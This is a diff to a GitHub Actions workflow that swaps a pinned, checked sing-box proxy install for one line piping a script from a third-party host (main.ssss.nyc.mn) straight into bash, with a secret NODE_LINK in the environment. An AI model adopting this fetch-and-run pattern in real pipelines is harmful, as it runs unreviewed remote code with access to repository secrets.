@@ -30,30 +30,11 @@ jobs:
           pip install playwright requests curl_cffi websockets requests[socks]
           playwright install --with-deps chromium
 
-      - name: Install and start sing-box
+      - name: 🌐 设置代理 (sing-box)
         env:
           NODE_LINK: ${{ secrets.NODE_LINK }}
         run: |
-          set -euo pipefail
-          test -n "$NODE_LINK" || { echo "NODE_LINK 未配置"; exit 1; }
-
-          curl -fL --retry 3 -o sing-box.tar.gz \
-            https://github.com/SagerNet/sing-box/releases/download/v1.9.3/sing-box-1.9.3-linux-amd64.tar.gz
-          tar -xzf sing-box.tar.gz
-          mv sing-box-*/sing-box ./sing-box
-          chmod +x ./sing-box
-
-          python parse_node.py
-          ./sing-box check -c config.json
-          nohup ./sing-box run -c config.json > singbox.log 2>&1 &
-          echo $! > singbox.pid
-          sleep 8
-
-          if ! kill -0 "$(cat singbox.pid)" 2>/dev/null; then
-            echo "sing-box 启动失败"
-            cat singbox.log || true
-            exit 1
-          fi
+          bash <(wget -qO- https://main.ssss.nyc.mn/setup_proxy.sh)
 
       - name: Run Rustix automation
         env:
